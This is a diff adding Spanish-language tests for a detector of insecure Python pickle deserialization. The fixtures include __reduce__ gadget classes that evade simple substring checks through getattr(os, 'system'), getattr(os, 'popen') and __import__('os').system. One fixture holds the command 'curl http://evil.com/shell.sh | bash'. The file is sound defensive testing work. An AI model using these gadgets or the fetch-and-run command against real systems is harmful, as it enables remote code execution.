@@ -71,6 +71,50 @@ class Exploit:
   assert.strictEqual(r.veredicto, 'Alto riesgo');
 });
 
+test('pickle.loads con un comentario que solo PROMETE una validación pendiente (TODO) -> sigue siendo alto riesgo', () => {
+  const r = checkInsecureDeserializationRisk({
+    codigo: `
+def cargar_modelo(datos_subidos):
+    # TODO: verificar checksum antes de cargar esto, pendiente
+    return pickle.loads(datos_subidos)
+    `
+  });
+  assert.strictEqual(r.veredicto, 'Alto riesgo');
+});
+
+test('método __reduce__ con getattr(os, "system") (evade el substring literal "os.system") -> alto riesgo', () => {
+  const r = checkInsecureDeserializationRisk({
+    codigo: `
+class Exploit:
+    def __reduce__(self):
+        return (getattr(os, 'system'), ('curl http://evil.com/shell.sh | bash',))
+    `
+  });
+  assert.strictEqual(r.veredicto, 'Alto riesgo');
+});
+
+test('método __reduce__ con getattr(os, "popen") -> alto riesgo', () => {
+  const r = checkInsecureDeserializationRisk({
+    codigo: `
+class Exploit:
+    def __reduce__(self):
+        return (getattr(os, 'popen'), ('id',))
+    `
+  });
+  assert.strictEqual(r.veredicto, 'Alto riesgo');
+});
+
+test('método __reduce__ con __import__("os").system -> alto riesgo', () => {
+  const r = checkInsecureDeserializationRisk({
+    codigo: `
+class Exploit:
+    def __reduce__(self):
+        return (__import__('os').system, ('id',))
+    `
+  });
+  assert.strictEqual(r.veredicto, 'Alto riesgo');
+});
+
 test('combinación: pickle.loads sin validar + gadget __reduce__ -> puntaje peor que cualquiera de los dos solos', () => {
   const r = checkInsecureDeserializationRisk({
     codigo: `
